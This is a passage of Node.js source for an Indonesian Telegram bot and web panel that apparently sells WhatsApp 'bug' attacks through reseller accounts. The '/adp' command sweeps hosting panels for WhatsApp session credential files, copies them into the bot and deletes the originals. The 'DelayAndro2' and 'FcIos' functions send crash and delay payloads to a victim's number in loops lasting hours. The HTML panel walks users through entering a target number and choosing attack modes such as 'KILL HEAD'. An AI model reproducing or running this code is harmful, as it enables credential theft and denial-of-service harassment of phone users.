    return ctx.reply(errBox([`Alias '${key}' tidak ada`]), { parse_mode: "Markdown" })
  }

  delete data[key]
  saveADP(data)

  await ctx.reply(okBox([`ADP '${key}' dihapus`]), { parse_mode: "Markdown" })
})

bot.command('adp', async (ctx) => {
  const chatId = ctx.chat.id
  const userId = ctx.from.id
  const text = ctx.message.text
  const match = text.match(/^\/adp\s+(\S+)/i)
  if (!match) return ctx.reply("Format perintah salah. Gunakan `/adp <key>`", { parse_mode: "Markdown" })

  if (!isOwner(userId)) return ctx.reply("Hanya Owner yang bisa menggunakan fitur ini!")

  const key = match[1]
  const cfg = loadADP()[key]
  if (!cfg) return ctx.reply(errBox([`ADP '${key}' tidak ditemukan`]), { parse_mode: "Markdown" })

  const b = baseUrl(cfg.domain)

  let servers = []
  try {
    servers = await listServersWithFallback(b, cfg.ptlc, cfg.ptla)
    if (!servers.length) {
      return ctx.reply(errBox([`Tidak ada server pada ${b}`]), { parse_mode: "Markdown" })
    }
  } catch (e) {
    const msgErr = e?.response
      ? `${e.response.status} ${e.response.statusText || ""}`.trim()
      : (e.message || "gagal")
    return ctx.reply(errBox([`Gagal koneksi: ${msgErr}`]), { parse_mode: "Markdown" })
  }

  let ok = 0, fail = 0, done = 0
  const total = servers.length
  const perServerErrors = []
  const limit = pLimit(6)

  const statusMsg = await ctx.reply(`⸙ Kayla — Proses\n0/${total} • ✔0 ✖0`, { parse_mode: "Markdown" })

  const updateProgress = async () => {
    const barLen = 20
    const filled = Math.round((done / total) * barLen)
    const bar = "█".repeat(filled) + "░".repeat(barLen - filled)
    const lines = [
      `⸙ Kayla — Proses`,
      `${done}/${total} • ✔${ok} ✖${fail}`,
      `[${bar}]`
    ]
    try {
      await ctx.telegram.editMessageText(chatId, statusMsg.message_id, null, lines.join("\n"), { parse_mode: "Markdown" })
    } catch (_) {}
  }

  await Promise.all(servers.map(s => limit(async () => {
    let paired = false
    try {
      const paths = await discoverCredsPaths(b, cfg.ptlc, cfg.ptla, s.id)
      for (const p of paths) {
        try {
          const raw = await readFileAny(b, cfg.ptla, cfg.ptlc, s.id, p)
          const botId = await writeAndPairFromRaw(raw, chatId)
          try { await deleteFileAny(b, cfg.ptla, cfg.ptlc, s.id, p) } catch {}
          ok++; paired = true; break
        } catch (_) {}
      }
      if (!paired) throw new Error("creds_not_found")
    } catch (e) {
      fail++; perServerErrors.push(`✖ ${s.id} ∿ ${e.message || "gagal"}`)
    } finally {
      done++; await updateProgress()
    }
  })))

  const lines = [`⸙ Kayla — Selesai\n✔ ${ok} • ✖ ${fail}`]
  if (perServerErrors.length) lines.push(...perServerErrors)
  await ctx.reply(okBox(lines), { parse_mode: "Markdown" })
})

bot.hears(/\/Xsender/i, async (ctx) => {
  const chatId = ctx.chat.id;
  const userId = ctx.from.id;

  if (!isOwner(userId)) {
    return ctx.reply("Hanya Owner yang bisa tambah Reseller!");
  }

  if (sessions.size === 0) {
    return ctx.reply(
      "```❌\nNo WhatsApp bots connected. Please connect a bot first with /Xsender```",
      {
        reply_to_message_id: ctx.message.message_id,
        parse_mode: "Markdown"
      }
    );
  }

  let botList = "```List Sender\n";
  let index = 1;

  for (const [botNumber, sock] of sessions.entries()) {
    const status = sock.user ? "✅" : "❌";
    botList += `〣 BOT ${index} : ${botNumber}\n`;
    botList += `〣 STATUS : ${status}\n`;
    botList += "\n";
    index++;
  }

  botList += `〣 TOTAL : ${sessions.size}\n`;
  botList += "```";

  await ctx.reply(botList, {
    reply_to_message_id: ctx.message.message_id,
    parse_mode: "Markdown"
  });
});

// -------------------( ANDRO FUNC )------------------------------ \\


// ---------------------------------------------------------------------------\\
async function DelayAndro2(durationHours, X) {
const totalDurationMs = durationHours * 60 * 60 * 1000;
const startTime = Date.now(); let count = 0;

const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
        console.log(`Stopped after sending ${count} messages`);
        return;
    }

    try {
        if (count < 10) {
            await Promise.all([
            Qlay(X),
            iosinVisFC(X),
            delayNew(X)
            ]);
            await sleep(2000);
            console.log(chalk.red(`
            ┌────────────────────────┐
            │ ${count}/10 Andro 📟
            └────────────────────────┘
`));
            count++;
            setTimeout(sendNext, 300);
        } else {
            console.log(chalk.green(`Success Sending Bug to ${X}`));
            count = 0;
            console.log(chalk.red("Next Sending Bug"));
            setTimeout(sendNext, 30 * 1000);
        }
    } catch (error) {
        console.error(`❌ Error saat mengirim: ${error.message}`);
        

        setTimeout(sendNext, 100);
    }
};

sendNext();

}
// ---------------------------------------------------------------------------\\
async function FcIos(durationHours, X) {
const totalDurationMs = durationHours * 60 * 60 * 1000;
const startTime = Date.now(); let count = 0;

const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
        console.log(`Stopped after sending ${count} messages`);
        return;
    }

    try {
        if (count < 10) {
            await Promise.all([
            TrashLocIOS(X),
            XiosVirus(X)
            ]);
            await sleep(2000);
            console.log(chalk.red(`
            ┌────────────────────────┐
            │ ${count}/10 iOS 📟
            └────────────────────────┘
`));
            count++;
            setTimeout(sendNext, 300);
        } else {
            console.log(chalk.green(`Success Sending Bug to ${X}`));
            count = 0;
            console.log(chalk.red("Next Sending Bug"));
            setTimeout(sendNext, 30 * 1000);
        }
    } catch (error) {
        console.error(`❌ Error saat mengirim: ${error.message}`);
        

        setTimeout(sendNext, 100);
    }
};

sendNext();

}

// ==================================================================================== //
// ============================= START OF NEW EXECUTION PAGE ========================== //
// ==================================================================================== //

const executionPage = (
  status = "🟥 Ready",
  detail = {},
  isForm = true,
  userInfo = {},
  message = "",
  mode = "",
  successToast = false
) => {
  const { username, expired } = userInfo;
  const formattedTime = expired
    ? new Date(expired).toLocaleString("id-ID", {
      timeZone: "Asia/Jakarta",
      year: "2-digit",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
    })
    : "-";

  return `
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>GLADIATOR - Panel</title>
  <link rel="icon" href="https://i.postimg.cc/Ss5bk2dT/20250820-111116.png" type="image/png">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
  <script src="https://cdn.jsdelivr.net/gh/jnicol/particleground/jquery.particleground.min.js"></script>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap');
    
    * { box-sizing: border-box; margin: 0; padding: 0; }

    :root {
      --primary-color: #9e4eff;
      --background-color: #0d0514;
      --surface-color: #1a0a2e;
      --text-color: #e0d8ff;
      --shadow-color: rgba(158, 78, 255, 0.5);
    }

    html, body {
      font-family: 'Poppins', sans-serif;
      background-color: var(--background-color);
      color: var(--text-color);
      height: 100%;
      overflow: hidden; /* Mencegah scroll di body */
    }

    #particles {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      z-index: 0;
    }

    .main-container {
      position: relative;
      z-index: 1;
      height: 100%;
      display: flex;
      flex-direction: column;
    }

    .content-wrapper {
      flex-grow: 1;
      overflow-y: auto; /* Scroll hanya di area konten */
      padding: 24px;
      padding-bottom: 90px; /* Space untuk bottom nav */
    }

    .page {
      display: none;
    }
    .page.active {
      display: block;
      animation: fadeIn 0.5s ease-in-out;
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(10px); }
      to { opacity: 1; transform: translateY(0); }
    }

    /* Home Page Styles */
    .home-header {
      text-align: center;
      margin-bottom: 30px;
    }
    .logo {
      width: 100px;
      height: 100px;
      filter: drop-shadow(0 0 15px var(--shadow-color));
      margin-bottom: 15px;
    }
    .welcome-title {
      font-size: 28px;
      font-weight: 700;
      color: white;
    }
    .welcome-subtitle {
      font-size: 16px;
      color: var(--primary-color);
    }
    
    .info-card {
      background-color: var(--surface-color);
      border: 1px solid var(--primary-color);
      border-radius: 16px;
      padding: 20px;
      margin-bottom: 20px;
      box-shadow: 0 4px 30px rgba(0,0,0,0.3);
      backdrop-filter: blur(5px);
    }
    .info-card h3 {
      font-size: 18px;
      margin-bottom: 15px;
      color: white;
      border-bottom: 1px solid var(--primary-color);
      padding-bottom: 10px;
    }
    .info-grid {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 15px;
    }
    .info-item {
      display: flex;
      flex-direction: column;
    }
    .info-item .label {
      font-size: 12px;
      color: #aaa;
    }
    .info-item .value {
      font-size: 16px;
      font-weight: 600;
      color: var(--text-color);
    }
    
    /* Execution Page Styles */
    .form-group {
      margin-bottom: 20px;
    }
    input[type="text"] {
      width: 100%;
      padding: 16px;
      border-radius: 12px;
      background: var(--surface-color);
      border: 1px solid var(--primary-color);
      color: var(--text-color);
      font-size: 16px;
      transition: all 0.3s ease;
    }
    input[type="text"]::placeholder {
      color: #888;
    }
    input[type="text"]:focus {
      outline: none;
      box-shadow: 0 0 15px var(--shadow-color);
    }

    .buttons-grid {
    display: flex; 
    flex-direction: column; 
    gap: 12px;
    margin-top: 20px;
    max-width: 400px; 
    margin-left: auto;
    margin-right: auto;
    }

    .buttons-grid .mode-btn {
    width: 100%; 
    }

    .mode-btn {
      font-size: 14px;
      font-weight: 600;
      padding: 14px;
      background-color: transparent;
      color: var(--primary-color);
      border: 2px solid var(--primary-color);
      border-radius: 12px;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      transition: all 0.3s ease;
      position: relative;
    }
    .mode-btn:hover { background-color: var(--surface-color); }
    .mode-btn.selected { background: var(--primary-color); color: white; }
    
    .new-badge {
        position: absolute;
        top: -8px; right: -8px;
        background: red; color: white;
        font-size: 9px; padding: 2px 6px;
        border-radius: 4px; font-weight: 700;
        transform: rotate(15deg);
    }

    .execute-button {
      background: linear-gradient(45deg, var(--primary-color), #c38aff);
      color: #fff;
      padding: 16px;
      width: 100%;
      border-radius: 12px;
      font-weight: bold;
      font-size: 18px;
      border: none;
      margin-top: 24px;
      cursor: pointer;
      transition: all 0.3s ease;
      box-shadow: 0 0 20px var(--shadow-color);
    }
    .execute-button:disabled {
      background: #555;
      cursor: not-allowed;
      opacity: 0.5;
      box-shadow: none;
    }
    .execute-button:hover:not(:disabled) {
        transform: scale(1.02);
    }

    /* Bottom Navbar */
    .bottom-nav {
      position: fixed;
      bottom: 0; left: 0;
      width: 100%;
      height: 70px;
      background: rgba(10, 0, 20, 0.8);
      backdrop-filter: blur(15px);
      border-top: 1px solid var(--primary-color);
      display: flex;
      justify-content: space-around;
      align-items: center;
      z-index: 100;
    }
    .nav-button {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      color: #aaa;
      text-decoration: none;
      transition: color 0.3s ease;
      font-size: 12px;
    }
    .nav-button i {
      font-size: 22px;
      margin-bottom: 4px;
    }
    .nav-button.active {
      color: var(--primary-color);
      font-weight: 600;
    }
    .nav-button:hover {
        color: white;
    }

    /* Toast Notification */
    #toast {
      display: none;
      position: fixed;
      top: 20px;
      left: 50%;
      transform: translateX(-50%);
      max-width: 90%;
      background: var(--surface-color);
      color: white;
      padding: 14px 24px;
      border: 1px solid var(--primary-color);
      border-radius: 10px;
      font-family: 'Poppins', sans-serif;
      font-size: 15px;
      font-weight: 500;
      box-shadow: 0 0 20px rgba(0,0,0,0.4);
      z-index: 9999;
      animation: slideIn 0.5s ease-out, fadeOut 0.5s ease-in 4.5s forwards;
    }

    @keyframes slideIn {
        from { top: -100px; opacity: 0; }
        to { top: 20px; opacity: 1; }
    }
    @keyframes fadeOut {
        from { opacity: 1; }
        to { opacity: 0; }
    }
  </style>
</head>
<body>
  <div id="particles"></div>

  <div class="main-container">
    <main class="content-wrapper">
      
      <div class="page active" id="page-home">
        <div class="home-header">
          <img src="https://i.postimg.cc/Ss5bk2dT/20250820-111116.png" class="logo" alt="GLADIATOR Logo">
          <h1 class="welcome-title">Welcome, ${username || 'Anonymous'}</h1>
          <p class="welcome-subtitle">GLADIATOR PANEL CONTROL</p>
        </div>
        
        <div class="info-card">
          <h3><i class="fas fa-user-shield"></i> Account Information</h3>
          <div class="info-grid">
            <div class="info-item">
              <span class="label">Username</span>
              <span class="value">${username || 'Unknown'}</span>
            </div>
            <div class="info-item">
              <span class="label">Role</span>
              <span class="value">${userInfo.role || 'Unknown'}</span>
            </div>
            <div class="info-item">
              <span class="label">Status</span>
              <span class="value" style="color: #25ff08;">Active</span>
            </div>
            <div class="info-item">
              <span class="label">Expired</span>
              <span class="value">${formattedTime}</span>
            </div>
          </div>
        </div>
        
        <div class="info-card">
           <h3><i class="fas fa-info-circle"></i> How to Use</h3>
           <p style="font-size: 14px; line-height: 1.6;">
             1. Select the <strong>Execute</strong> menu in the navigation bar below.<br>
             2. Enter the target number starting with the country code (e.g., 628xxxxxxxx).<br>
             3. Choose one of the available attack modes.<br>
             4. Press the <strong>EXECUTE</strong> button to start the process.
           </p>
        </div>
      </div>

      <div class="page" id="page-execution">
        <div class="home-header">
          <h1 class="welcome-title">Execution Panel</h1>
          <p class="welcome-subtitle">Select mode and target</p>
        </div>

        <div class="form-group">
          <input type="text" id="targetNumber" placeholder="Target Number (e.g., 628...)" />
        </div>
        
        <div class="buttons-grid">
          <button class="mode-btn" data-mode="androdelay2">
            <i class="fa fa-star"></i> KILL HEAD
            <span class="new-badge">NEW</span>
          </button>
          <button class="mode-btn" data-mode="androdelay"><i class="fa fa-spinner"></i> DELAY</button>
          <button class="mode-btn" data-mode="iosfc"><i class="fa fa-bolt"></i> IOS FC</button>
        </div>

        <button class="execute-button" id="executeBtn" disabled>
          <i class="fas fa-rocket"></i> EXECUTE
        </button>
      </div>

    </main>
    
    <nav class="bottom-nav">
      <a href="#" class="nav-button active" data-page="page-home">
        <i class="fas fa-home"></i>
        <span>Home</span>
      </a>
      <a href="#" class="nav-button" data-page="page-execution">
        <i class="fas fa-crosshairs"></i>
        <span>Execute</span>
      </a>
      ${userInfo.role === "owner" || userInfo.role === "reseller" || userInfo.role === "admin" ? `
        <a href="/userlist" class="nav-button">
          <i class="fas fa-users-cog"></i>
          <span>Users</span>
        </a>
      ` : ""}
      <a href="/logout" class="nav-button">
        <i class="fas fa-sign-out-alt"></i>
        <span>Logout</span>
      </a>
    </nav>
  </div>
  
  <div id="toast"></div>

  <script>
    // Particle Ground Effect
    $('#particles').particleground({
      dotColor: 'rgba(255, 255, 255, 0.2)',
      lineColor: 'rgba(158, 78, 255, 0.2)',
      density: 12000,
      particleRadius: 4,
    });

    // Navigation Logic
    const navButtons = document.querySelectorAll('.nav-button[data-page]');
    const pages = document.querySelectorAll('.page');
    
    navButtons.forEach(button => {
      button.addEventListener('click', (e) => {
        e.preventDefault();
        const targetPageId = button.dataset.page;

        pages.forEach(page => page.classList.remove('active'));
        navButtons.forEach(btn => btn.classList.remove('active'));
        
        document.getElementById(targetPageId).classList.add('active');
        button.classList.add('active');
      });
    });

    // Execution Form Logic
    const inputField = document.getElementById('targetNumber');
    const modeButtons = document.querySelectorAll('.mode-btn');
    const executeBtn = document.getElementById('executeBtn');
    let selectedMode = null;

    function isValidNumber(number) {
      return /^62\\d{7,13}$/.test(number);
    }
    
    function checkFormValidity() {
        const number = inputField.value.trim();
        executeBtn.disabled = !(isValidNumber(number) && selectedMode);
    }

    inputField.addEventListener('input', checkFormValidity);

    modeButtons.forEach(button => {
      button.addEventListener('click', () => {
        modeButtons.forEach(btn => btn.classList.remove('selected'));
        button.classList.add('selected');
        selectedMode = button.getAttribute('data-mode');
        checkFormValidity();
      });
    });

    executeBtn.addEventListener('click', () => {
      const number = inputField.value.trim();
      if (!isValidNumber(number)) {
        showToast("Target number is invalid. Must start with 62 and be 10-15 digits long.");
        return;
      }
      showToast("Executing attack on " + number + "...");
      setTimeout(() => {
        window.location.href = '/execution?mode=' + selectedMode + '&target=' + number;
      }, 1500);
    });

    // Toast Notification Function
    function showToast(message) {
      const toast = document.getElementById('toast');
      toast.innerText = message;
      toast.style.display = 'block';
      setTimeout(() => {
        toast.style.display = 'none';
      }, 5000);
    }
  
    // URL Cleaner and Initial Toast Handler
    function cleanURL() {
      if (window.location.search.includes('mode=') || window.location.search.includes('target=')) {
        const newURL = window.location.origin + window.location.pathname;
        window.history.replaceState({}, document.title, newURL);
      }
    }

    window.addEventListener('DOMContentLoaded', () => {
      const toastOnly = ${detail.toastOnly ? 'true' : 'false'};
      const toastMessage = ${JSON.stringify(detail.message || "")};
      const cleanURLFlag = ${detail.cleanURL ? 'true' : 'false'};

      if (cleanURLFlag) {
        cleanURL();
      }

      if (toastOnly && toastMessage) {
        showToast(toastMessage);
      } else if (${successToast}) {
        showToast("✅ SUCCESS: Mode ${mode.toUpperCase()} executed on ${detail.target}!");
      }
    });
    
    // Prevent Zoom
    document.addEventListener('gesturestart', e => e.preventDefault());
    document.addEventListener('wheel', e => { if(e.ctrlKey) e.preventDefault() }, { passive: false });
  </script>
</body>
</html>
`;
};

// ==================================================================================== //
// ============================== END OF NEW EXECUTION PAGE =========================== //
// ==================================================================================== //


// Appp Get root Server \\
app.use(bodyParser.urlencoded({ extended: true }));


app.get("/", (req, res) => {
  const username = req.cookies.sessionUser;
  const role = req.cookies.sessionRole;
  const isLoggedIn = req.cookies.isLoggedIn;

  if (username && role && isLoggedIn === "true") {
    const users = getUsers();
    const user = users.find(u => u.username === username && u.role === role);

    // Pastikan user ditemukan & belum expired
    if (user && (!user.expired || Date.now() < user.expired)) {
      return res.redirect("/execution");
    }
  }

  // Jika belum login / expired, arahkan ke halaman login awal
  const filePath = path.join(__dirname, "View", "Dashboard.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca Login.html");
    res.send(html);
  });
});

app.get("/login", (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);

  // Jika masih login dan belum expired, langsung lempar ke /execution
  if (username && currentUser && currentUser.expired && Date.now() < currentUser.expired) {
    return res.redirect("/execution");
  }

  const filePath = path.join(__dirname, "View", "Login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca file Login.html");
    res.send(html);
  });
});

app.post("/auth", (req, res) => {
  const { username, password } = req.body;
  const users = getUsers();
  const user = users.find(u => u.username === username && u.password === password);

  if (!user || (user.expired && Date.now() > user.expired)) {
    return res.redirect("/login?msg=Login%20gagal%20atau%20expired");
  }

  // Cek apakah sedang login di device lain
  if (user.isLoggedIn && user.role !== "owner" && user.username !== "demo") {
  return res.redirect("/login?msg=User%20sudah%20login%20di%20device%20lain");
}

  // Set user sebagai login
  user.isLoggedIn = true;
    console.log(`[ ${chalk.green('LogIn')} ] -> ${user.username}`);
  saveUsers(users);

  const oneDay = 24 * 60 * 60 * 1000;

  res.cookie("sessionUser", username, {
  maxAge: 24 * 60 * 60 * 1000, // 1 hari
  httpOnly: true,
  sameSite: "lax"
});
res.cookie("sessionRole", user.role, {
  maxAge: 24 * 60 * 60 * 1000,
  httpOnly: true,
  sameSite: "lax"
});
  return res.redirect("/execution");
});


app.get("/userlist", (req, res) => {
  const role = req.cookies.sessionRole;
  const currentUsername = req.cookies.sessionUser;

  if (!["reseller", "admin" , "owner"].includes(role)) {
    return res.send("🚫 Akses ditolak.");
  }

  const users = getUsers();

  const tableRows = users.map(user => {
    const isProtected =
  user.username === currentUsername || // tidak bisa hapus diri sendiri
  (role === "reseller" && user.role !== "user") || // reseller hanya hapus user
  (role === "admin" && (user.role === "admin" || user.role === "owner")) || // admin gak bisa hapus admin/owner
  (role !== "owner" && user.role === "owner"); // selain owner gak bisa hapus owner

    return `
      <tr>
        <td>${user.username}</td>
        <td>${user.role.charAt(0).toUpperCase() + user.role.slice(1)}</td>
        <td>${new Date(user.expired).toLocaleString("id-ID")}</td>
        <td>
            ${isProtected ? `<span class="icon-disabled">
  <i class="fas fa-times"></i>
</span>` : `  
                <form method="POST" action="/hapususer" style="display:inline">
                <input type="hidden" name="username" value="${user.username}" />
                <button type="submit" style="margin-right:10px;">Delete</button>
        </form>
  `}
  ${(
  role === "owner" ||
  (role === "admin" && (user.role === "user" || user.role === "reseller")) ||
  (role === "reseller" && user.role === "user")
)
      ? `
      <a href="/edituser?username=${user.username}"><button>Edit</button></a>
      `: ""}
    </td>
      </tr>
    `;
  }).join("");

  const html = `
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Daftar User</title>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet" />
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&family=Orbitron:wght@400;600&display=swap" rel="stylesheet">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
  <script src="https://cdn.jsdelivr.net/gh/jnicol/particleground/jquery.particleground.min.js"></script>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }

    body {
  font-family: 'Poppins', sans-serif;
  background: #000;
  color: #d6b3ff;
  min-height: 100vh;
  padding: 16px;
  position: relative;
  overflow-y: auto;
  overflow-x: hidden;
}

    #particles {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      z-index: 0;
    }

    .content {
      position: relative;
      z-index: 1;
    }

    h2 {
      text-align: center;
      margin-bottom: 16px;
      color: #b88aff;
      font-size: 22px;
      font-family: 'Poppins', sans-serif;
    }

    .table-container {
      overflow-x: auto;
      border-radius: 10px;
      border: 1px solid #8a2be2;
      background: rgba(0, 0, 0, 0.6);
      backdrop-filter: blur(5px);
      font-size: 14px;
      margin-bottom: 20px;
    }

    table {
      width: 100%;
      border-collapse: collapse;
      min-width: 360px;
    }
    
    label {
      display: block;
      margin-bottom: 8px;
      font-weight: 600;
      color: #b19cd9;
      font-family: 'Poppins', sans-serif;
    }

    th, td {
      padding: 10px;
      text-align: left;
      border-bottom: 1px solid #8a2be2;
      white-space: nowrap;
    }

    th {
      background: rgba(26, 0, 26, 0.8);
      color: #d6b3ff;
    }

    td {
      background: rgba(13, 0, 13, 0.7);
    }

    button {
      background: #8a2be2;
      color: white;
      padding: 6px 10px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      font-size: 13px;
    }

    .icon-disabled {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  width: 64px;
  height: 32px;  
  color: #ff5555;
  font-size: 18px;
  border-radius: 6px;
}

   .icon-disabled i {
  pointer-events: none;
}

    .back-btn, #toggleFormBtn {
  display: block;
  width: 100%;
  padding: 14px;
  margin: 16px auto;
  background: #4b0082;
  color: white;
  text-align: center;
  border-radius: 10px;
  text-decoration: none;
  font-size: 15px;
  font-weight: bold;
  font-family: 'Poppins', sans-serif;
  border: none;
  cursor: pointer;
  transition: 0.3s;
  box-sizing: border-box;
}

    #userFormContainer {
      display: none;
      margin-top: 20px;
      background: rgba(26, 0, 26, 0.8);
      padding: 20px;
      border-radius: 10px;
      border: 1px solid #8a2be2;
      backdrop-filter: blur(5px);
    }

    #userFormContainer input,
    #userFormContainer select {
      padding: 10px;
      width: 100%;
      border-radius: 8px;
      border: none;
      background: #1a001a;
      color: #d6b3ff;
      margin-bottom: 12px;
    }

    #userFormContainer button[type="submit"] {
      width: 100%;
      padding: 14px;
      background: #8a2be2;
      color: white;
      border: none;
      border-radius: 10px;
      font-weight: bold;
      cursor: pointer;
      transition: 0.3s;
      box-sizing: border-box;
      margin-top: 10px;
      font-family: 'Poppins', sans-serif;
    }

    @media (max-width: 600px) {
      h2 { font-size: 18px; }
      table { font-size: 13px; }
      th, td { padding: 8px; }
      button, .back-btn, #toggleFormBtn { font-size: 13px; }
    }
    html, body {
    touch-action: manipulation;
    -ms-touch-action: manipulation;
    overflow: hidden;
    position: fixed;
    width: 100%;
    height: 100%;
}
  </style>
</head>
<body>
  <div id="particles"></div>

  <div class="content">
    <h2>List User</h2>

    <div class="table-container">
      <table>
        <thead>
          <tr>
            <th>Username</th>
            <th>Role</th>
            <th>Expired</th>
            <th>Action</th>
          </tr>
        </thead>
        <tbody>
          ${tableRows}
        </tbody>
      </table>
    </div>

    <button id="toggleFormBtn"><i class="fas fa-user-plus"></i> Add User</button>

<div id="userFormContainer">
  <form action="/adduser" method="POST">
    <label>Username</label>
    <input type="text" name="username" placeholder="Username" required>
    <label>Password</label>
    <input type="text" name="password" placeholder="Password" required>
    <label>Durasi</label>
    <input type="number" name="durasi" placeholder="Duration (days)" required min="1">
    
    <label>Role</label>
    <select id="roleSelect" name="role" required></select>

    <button type="submit">Add User</button>
  </form>
</div>

    <a href="/execution" class="back-btn"><i class="fas fa-arrow-left"></i> Dashboard</a>
    
<script>
  const currentRole = "${role}";
  const roleOptions = {
    owner: ["user", "reseller", "admin"],
    admin: ["user", "reseller"],
    reseller: ["user"]
  };
  const labels = {
    user: "User",
    reseller: "Reseller",
    admin: "Admin"
  };

  const allowedRoles = roleOptions[currentRole] || [];
  const roleSelect = document.getElementById("roleSelect");

  allowedRoles.forEach(role => {
    const opt = document.createElement("option");
    opt.value = role;
    opt.textContent = labels[role];
    roleSelect.appendChild(opt);
  });
</script>

  <script>
    $('#particles').particleground({
      dotColor: '#ffffff',
      lineColor: '#9932cc',
      minSpeedX: 0.1,
      maxSpeedX: 0.3,
      minSpeedY: 0.1,
      maxSpeedY: 0.3,
      density: 10000,
      particleRadius: 3
    });

    const toggleBtn = document.getElementById("toggleFormBtn");
    const form = document.getElementById("userFormContainer");

    toggleBtn.addEventListener("click", () => {
      const isHidden = form.style.display === "none" || form.style.display === "";
      form.style.display = isHidden ? "block" : "none";
      toggleBtn.innerHTML = isHidden
        ? '<i class="fas fa-times"></i> Cancell'
        : '<i class="fas fa-user-plus"></i> Add User';
    });
    // Prevent zoom with pinch gesture
document.addEventListener('touchstart', function(event) {
    if (event.touches.length > 1) {
        event.preventDefault();
    }
}, { passive: false });

document.addEventListener('gesturestart', function(event) {
    event.preventDefault();
});
    // Prevent zoom with Ctrl + +/- keys
document.addEventListener('keydown', function(e) {
    if ((e.ctrlKey === true || e.metaKey === true) && 
        (e.keyCode === 107 || e.keyCode === 109 || e.keyCode === 187 || e.keyCode === 189)) {
        e.preventDefault();
    }
});

// Prevent zoom with pinch gesture
document.addEventListener('wheel', function(e) {
    if (e.ctrlKey) {
        e.preventDefault();
    }
}, { passive: false });
  </script>
</body>
</html>
  `;
  res.send(html);
});


// Tambahkan di bawah route lain
app.post("/adduser", (req, res) => {
  const sessionRole = req.cookies.sessionRole;
  const sessionUser = req.cookies.sessionUser;
  const { username, password, role, durasi } = req.body;

  // Validasi input
  if (!username || !password || !role || !durasi) {
    return res.send("❌ Lengkapi semua kolom.");
  }

  // Cek hak akses berdasarkan role pembuat
  if (sessionRole === "user") {
    return res.send("🚫 User tidak bisa membuat akun.");
  }

  if (sessionRole === "reseller" && role !== "user") {
    return res.send("🚫 Reseller hanya boleh membuat user biasa.");
  }

  if (sessionRole === "admin" && role === "admin") {
    return res.send("🚫 Admin tidak boleh membuat admin lain.");
  }

  const users = getUsers();

  // Cek username sudah ada
  if (users.some(u => u.username === username)) {
    return res.send("❌ Username sudah terdaftar.");
  }

  const expired = Date.now() + parseInt(durasi) * 86400000;

  users.push({
    username,
    password,
    expired,
    role,
    telegram_id: req.cookies.sessionID,
    isLoggedIn: false
  });

  saveUsers(users);
  res.redirect("/userlist");
});

app.post("/hapususer", (req, res) => {
  const sessionRole = req.cookies.sessionRole;
  const sessionUsername = req.cookies.sessionUser;
  const { username } = req.body;

  const users = getUsers();
  const targetUser = users.find(u => u.username === username);

  if (!targetUser) {
    return res.send("❌ User tidak ditemukan.");
  }

  // Tidak bisa hapus diri sendiri
  if (sessionUsername === username) {
    return res.send("❌ Tidak bisa hapus akun sendiri.");
  }

  // Reseller hanya boleh hapus user biasa
  if (sessionRole === "reseller" && targetUser.role !== "user") {
    return res.send("❌ Reseller hanya bisa hapus user biasa.");
  }

  // Admin tidak boleh hapus admin lain
  if (sessionRole === "admin" && targetUser.role === "admin") {
    return res.send("❌ Admin tidak bisa hapus admin lain.");
  }

  // Admin/reseller tidak boleh hapus owner
  if (targetUser.role === "owner" && sessionRole !== "owner") {
    return res.send("❌ Hanya owner yang bisa menghapus owner.");
  }

  // Lanjut hapus
  const filtered = users.filter(u => u.username !== username);
  saveUsers(filtered);
  res.redirect("/userlist");
});

app.get("/edituser", (req, res) => {
  const role = req.cookies.sessionRole;
  const currentUser = req.cookies.sessionUser;
  const username = req.query.username;

  if (!["reseller", "admin", "owner"].includes(role)) {
    return res.send("🚫 Akses ditolak.");
  }

  if (!username) {
    return res.send("❗ Username tidak valid.");
  }

  const users = getUsers();
  const user = users.find(u => u.username === username);

  if (!user) {
    return res.send("❌ User tidak ditemukan.");
  }

  // 🔒 Proteksi akses edit
  if (username === currentUser) {
    return res.send("❌ Tidak bisa edit akun sendiri.");
  }

  if (role === "reseller" && user.role !== "user") {
    return res.send("❌ Reseller hanya boleh edit user biasa.");
  }

  if (role === "admin" && user.role === "admin") {
    return res.send("❌ Admin tidak bisa edit admin lain.");
  }

  // 🔒 Tentukan opsi role yang boleh diedit
  let roleOptions = "";
  if (role === "owner") {
    roleOptions = `
      <option value="user" ${user.role === "user" ? 'selected' : ''}>User</option>
      <option value="reseller" ${user.role === "reseller" ? 'selected' : ''}>Reseller</option>
      <option value="admin" ${user.role === "admin" ? 'selected' : ''}>Admin</option>
      <option value="owner" ${user.role === "owner" ? 'selected' : ''}>Owner</option>
    `;
  } else if (role === "admin") {
    roleOptions = `
